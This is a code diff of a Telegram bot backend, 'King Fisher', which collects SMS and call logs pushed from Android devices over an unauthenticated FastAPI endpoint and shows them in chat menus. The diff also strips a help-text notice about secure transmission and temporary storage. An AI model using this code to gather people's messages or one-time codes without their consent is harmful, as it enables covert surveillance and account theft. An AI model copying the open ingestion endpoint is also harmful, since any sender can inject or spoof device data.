@@ -1,5 +1,16 @@
+"""
+King Fisher Bot - Real Device Data Integration
+Telegram bot that receives and displays real SMS/Call logs from Android devices
+
+Environment Variables:
+- BOT_TOKEN: Telegram bot token from BotFather
+- PUBLIC_URL: Public URL of the bot (e.g., https://your-bot.onrender.com)
+- WEBHOOK_SECRET: Secret token for webhook security
+
+Deployment: Render, Heroku, or any FastAPI-compatible platform
+"""
+
 import os
-import json
 import logging
 from contextlib import asynccontextmanager
 from typing import Dict, List
@@ -10,41 +21,51 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
+# ============ LOGGING ============
 logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
     level=logging.INFO,
 )
 logger = logging.getLogger("KingFisherBot")
 
+# ============ ENVIRONMENT ============
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
 WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "")
 
 if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN is not set")
+    raise RuntimeError("❌ BOT_TOKEN is not set")
 if not PUBLIC_URL:
-    raise RuntimeError("PUBLIC_URL is not set")
+    raise RuntimeError("❌ PUBLIC_URL is not set")
 
+# ============ TELEGRAM APP ============
 telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
 
-# Device Data Storage
+# ============ DATA STORAGE ============
 DEVICE_DATA = {
-    "sms": {},
-    "calls": {},
+    "sms": {},      # device_id -> list of SMS
+    "calls": {},    # device_id -> list of calls
     "devices": set()
 }
-MAX_HISTORY = 50
+MAX_HISTORY = 100  # Maximum items to keep per device
 
 class DeviceDataManager:
+    """Manages device data storage and retrieval"""
+    
     @staticmethod
     def store_sms(device_id: str, sms_list: List[Dict]):
         if device_id not in DEVICE_DATA["sms"]:
             DEVICE_DATA["sms"][device_id] = []
+        
         for sms in sms_list:
-            if "id" in sms:
-                existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms.get("id")]
+            sms_id = sms.get("id")
+            if sms_id:
+                # Avoid duplicates
+                existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms_id]
                 if not existing:
                     DEVICE_DATA["sms"][device_id].append(sms)
+        
+        # Keep only recent items
         DEVICE_DATA["sms"][device_id] = DEVICE_DATA["sms"][device_id][-MAX_HISTORY:]
         DEVICE_DATA["devices"].add(device_id)
 
@@ -52,27 +73,41 @@ class DeviceDataManager:
     def store_calls(device_id: str, call_list: List[Dict]):
         if device_id not in DEVICE_DATA["calls"]:
             DEVICE_DATA["calls"][device_id] = []
+        
         for call in call_list:
-            if "id" in call:
-                existing = [c for c in DEVICE_DATA["calls"][device_id] if c.get("id") == call.get("id")]
+            call_id = call.get("id")
+            if call_id:
+                existing = [c for c in DEVICE_DATA["calls"][device_id] if c.get("id") == call_id]
                 if not existing:
                     DEVICE_DATA["calls"][device_id].append(call)
+        
         DEVICE_DATA["calls"][device_id] = DEVICE_DATA["calls"][device_id][-MAX_HISTORY:]
         DEVICE_DATA["devices"].add(device_id)
 
     @staticmethod
-    def get_sms(device_id: str, limit: int = 10):
+    def get_sms(device_id: str, limit: int = 10) -> List[Dict]:
         return DEVICE_DATA["sms"].get(device_id, [])[-limit:]
 
     @staticmethod
-    def get_calls(device_id: str, limit: int = 10):
+    def get_calls(device_id: str, limit: int = 10) -> List[Dict]:
         return DEVICE_DATA["calls"].get(device_id, [])[-limit:]
 
     @staticmethod
-    def get_devices():
+    def get_devices() -> List[str]:
         return list(DEVICE_DATA["devices"])
 
-# UI Functions
+    @staticmethod
+    def get_stats() -> Dict:
+        sms_count = sum(len(v) for v in DEVICE_DATA["sms"].values())
+        call_count = sum(len(v) for v in DEVICE_DATA["calls"].values())
+        return {
+            "devices": len(DEVICE_DATA["devices"]),
+            "sms": sms_count,
+            "calls": call_count,
+            "total": sms_count + call_count
+        }
+
+# ============ UI COMPONENTS ============
 def main_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("📦 SYSTEM ITEMS", callback_data="items")],
@@ -89,8 +124,8 @@ def main_menu():
 def items_menu():
     return InlineKeyboardMarkup([
         [
-            InlineKeyboardButton("📩 SMS INBOX (REAL)", callback_data="sms"),
-            InlineKeyboardButton("📞 CALL LIST (REAL)", callback_data="call"),
+            InlineKeyboardButton("📩 SMS INBOX", callback_data="sms"),
+            InlineKeyboardButton("📞 CALL LIST", callback_data="call"),
         ],
         [InlineKeyboardButton("📊 SYSTEM STATUS", callback_data="status")],
         [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")],
@@ -101,7 +136,7 @@ def back_menu():
         [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")]
     ])
 
-# Text Templates
+# ============ TEXT TEMPLATES ============
 OPENING = """<b>╔════════════════════════════╗
    👑 KING FISHER SYSTEM
 ╚════════════════════════════╝</b>
@@ -111,7 +146,7 @@ OPENING = """<b>╔════════════════════�
 Welcome back, <b>{name}</b>.
 
 🟢 <b>Status:</b> Online
-⚡ <b>Mode:</b> Premium (Real Data)
+⚡ <b>Mode:</b> Real Data
 🛡️ <b>Security:</b> Protected
 
 <i>Select an option below to continue.</i>"""
@@ -129,32 +164,30 @@ Thank you for using <b>King Fisher</b>.
 
 HELP = """<b>❓ KING FISHER — HELP</b>
 
-📦 <b>System Items</b> — Real SMS/Call logs from your device
+📦 <b>System Items</b> — View real SMS/Call logs
 🔄 <b>Restart</b> — Refresh interface
 🔒 <b>Close</b> — Close current interface
-📊 <b>Status</b> — Show connected devices and data stats
+📊 <b>Status</b> — Show connected devices and stats
 
-⚠️ <b>Real Data Mode:</b>
-This bot reads real SMS and call logs from your connected Android device.
-Data is transmitted securely and stored temporarily.
-All data is deleted when the bot restarts."""
+<i>Data is collected in real-time from your Android device.</i>"""
 
 ABOUT = """<b>ℹ️ ABOUT KING FISHER</b>
 
 👑 <b>King Fisher Bot</b>
-Premium Telegram interface with real device data.
+Premium Telegram bot with real device integration.
 
 ━━━━━━━━━━━━━━━━━━
 🟢 Webhook: Active
-🟢 Runtime: Python
+🟢 Runtime: Python (FastAPI)
 🟢 Mode: Real Data
-🟢 Device: Android (Termux)
+🟢 Platform: Android + Termux
 ━━━━━━━━━━━━━━━━━━
 
 <i>Real-time SMS and call log monitoring.</i>"""
 
-# Formatter functions
+# ============ FORMATTERS ============
 def format_realtime_sms(sms_list: List[Dict]) -> str:
+    """Format SMS data for display"""
     if not sms_list:
         return "📭 <b>No SMS messages found</b>\n\n<i>Make sure your Android device is connected and running the sender script.</i>"
     
@@ -179,10 +212,20 @@ def format_realtime_sms(sms_list: List[Dict]) -> str:
     return "\n".join(lines)
 
 def format_realtime_calls(call_list: List[Dict]) -> str:
+    """Format call data for display"""
     if not call_list:
         return "📭 <b>No call logs found</b>\n\n<i>Make sure your Android device is connected and running the sender script.</i>"
     
     lines = ["<b>📞 REAL CALL LOGS</b>", "━━━━━━━━━━━━━━━━━━"]
+    
+    icons = {
+        "Incoming": "📞",
+        "Outgoing": "📤",
+        "Missed": "❌",
+        "Rejected": "🚫",
+        "Blocked": "⛔",
+        "Voicemail": "🎙️"
+    }
     
     for i, call in enumerate(call_list[:10], 1):
         number = call.get("number", "Unknown")
@@ -191,16 +234,9 @@ def format_realtime_calls(call_list: List[Dict]) -> str:
         timestamp = call.get("timestamp", "")
         call_type = call.get("type", "Unknown")
         
-        icons = {
-            "Incoming": "📞",
-            "Outgoing": "📤",
-            "Missed": "❌",
-            "Rejected": "🚫",
-            "Blocked": "⛔",
-            "Voicemail": "🎙️"
-        }
         icon = icons.get(call_type, "📞")
         
+        # Format duration
         duration_str = "0s"
         if duration.isdigit():
             dur = int(duration)
@@ -220,7 +256,7 @@ def format_realtime_calls(call_list: List[Dict]) -> str:
     lines.append(f"📊 <i>Total: {len(call_list)} calls</i>")
     return "\n".join(lines)
 
-# Command Handlers
+# ============ COMMAND HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name = update.effective_user.first_name or "User"
     await update.message.reply_text(
@@ -258,15 +294,15 @@ async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=back_menu(),
     )
 
-# Callback Handler
+# ============ CALLBACK HANDLER ============
 async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
     d = q.data
     
-    # Map user to device (simplified - in production, store device_id per user)
+    # Map user to device (one device per user)
     user_id = str(q.from_user.id)
-    device_id = f"device_{user_id}"  # Each user gets their own device mapping
+    device_id = f"device_{user_id}"
     
     if d == "items":
         await q.edit_message_text(
@@ -290,8 +326,7 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     elif d == "status":
         devices = DeviceDataManager.get_devices()
-        sms_count = sum(len(v) for v in DEVICE_DATA["sms"].values())
-        call_count = sum(len(v) for v in DEVICE_DATA["calls"].values())
+        stats = DeviceDataManager.get_stats()
         
         status_text = f"""<b>📊 SYSTEM STATUS</b>
 
@@ -300,14 +335,15 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🟢 <b>API:</b> Ready
 🟢 <b>Webhook:</b> Active
 
-📱 <b>Connected Devices:</b> {len(devices)}
-📩 <b>SMS Messages:</b> {sms_count}
-📞 <b>Call Logs:</b> {call_count}
+📱 <b>Connected Devices:</b> {stats['devices']}
+📩 <b>SMS Messages:</b> {stats['sms']}
+📞 <b>Call Logs:</b> {stats['calls']}
+📊 <b>Total Records:</b> {stats['total']}
 
 🔗 <b>Active Devices:</b>
 {chr(10).join([f'   • {d}' for d in devices[:5]]) if devices else '   • None'}
 ━━━━━━━━━━━━━━━━━━
-<i>Data collected in real-time from Android devices.</i>"""
+<i>Real-time data from Android devices.</i>"""
         
         await q.edit_message_text(
             status_text,
@@ -343,7 +379,7 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=main_menu(),
         )
 
-# Register handlers
+# ============ REGISTER HANDLERS ============
 telegram_app.add_handler(CommandHandler("start", start))
 telegram_app.add_handler(CommandHandler("restart", restart))
 telegram_app.add_handler(CommandHandler("close", close))
@@ -351,46 +387,74 @@ telegram_app.add_handler(CommandHandler("help", help_cmd))
 telegram_app.add_handler(CommandHandler("about", about))
 telegram_app.add_handler(CallbackQueryHandler(callbacks))
 
-# FastAPI app
+# ============ FASTAPI APP ============
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    """Application lifespan manager"""
+    # Startup
     await telegram_app.initialize()
     await telegram_app.start()
+    
     webhook_url = f"{PUBLIC_URL}/telegram/webhook"
     await telegram_app.bot.set_webhook(
         url=webhook_url,
         secret_token=WEBHOOK_SECRET or None,
         drop_pending_updates=True,
     )
-    logger.info("Webhook configured: %s", webhook_url)
+    logger.info("✅ Webhook configured: %s", webhook_url)
+    
     yield
+    
+    # Shutdown
     try:
         await telegram_app.stop()
         await telegram_app.shutdown()
-    except Exception:
-        logger.exception("Application shutdown error")
+        logger.info("✅ Bot shut down successfully")
+    except Exception as e:
+        logger.error(f"❌ Shutdown error: {e}")
 
 app = FastAPI(
     title="King Fisher Bot",
     version="3.0.0",
+    description="Real-time SMS and Call Log Monitor",
     lifespan=lifespan,
 )
 
+# ============ API ENDPOINTS ============
 @app.get("/")
 async def home():
+    """Root endpoint"""
     return {
         "status": "online",
         "service": "King Fisher Bot",
         "version": "3.0.0",
-        "mode": "Real Data"
+        "mode": "Real Data",
+        "docs": "/docs"
     }
 
 @app.get("/health")
 async def health():
-    return {"status": "healthy"}
+    """Health check endpoint"""
+    stats = DeviceDataManager.get_stats()
+    return {
+        "status": "healthy",
+        "devices": stats["devices"],
+        "messages": stats["total"]
+    }
 
 @app.post("/device/data")
 async def receive_device_data(request: Request):
+    """
+    Endpoint for Android devices to send data
+    
+    Expected payload:
+    {
+        "device_id": "android_phone1",
+        "type": "sms" | "call",
+        "data": [...],
+        "timestamp": "2024-01-01T12:00:00"
+    }
+    """
     try:
         data = await request.json()
         device_id = data.get("device_id")
@@ -402,16 +466,24 @@ async def receive_device_data(request: Request):
         
         if data_type == "sms":
             DeviceDataManager.store_sms(device_id, device_data)
+            logger.info(f"📩 Received {len(device_data)} SMS from {device_id}")
         elif data_type == "call":
             DeviceDataManager.store_calls(device_id, device_data)
+            logger.info(f"📞 Received {len(device_data)} calls from {device_id}")
         else:
             raise HTTPException(status_code=400, detail="Invalid data type")
         
-        logger.info(f"Received {len(device_data)} {data_type} from {device_id}")
-        return {"status": "ok", "device": device_id, "count": len(device_data)}
+        return {
+            "status": "ok",
+            "device": device_id,
+            "type": data_type,
+            "count": len(device_data)
+        }
     
+    except HTTPException:
+        raise
     except Exception as e:
-        logger.error(f"Error receiving device data: {e}")
+        logger.error(f"❌ Error receiving device data: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/telegram/webhook")
@@ -419,9 +491,15 @@ async def webhook(
     request: Request,
     x_telegram_bot_api_secret_token: str | None = Header(default=None),
 ):
+    """Telegram webhook endpoint"""
     if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
         raise HTTPException(status_code=403, detail="Invalid webhook secret")
-    data = await request.json()
-    update = Update.de_json(data, telegram_app.bot)
-    await telegram_app.process_update(update)
-    return {"ok": True}
+    
+    try:
+        data = await request.json()
+        update = Update.de_json(data, telegram_app.bot)
+        await telegram_app.process_update(update)
+        return {"ok": True}
+    except Exception as e:
+        logger.error(f"❌ Webhook error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
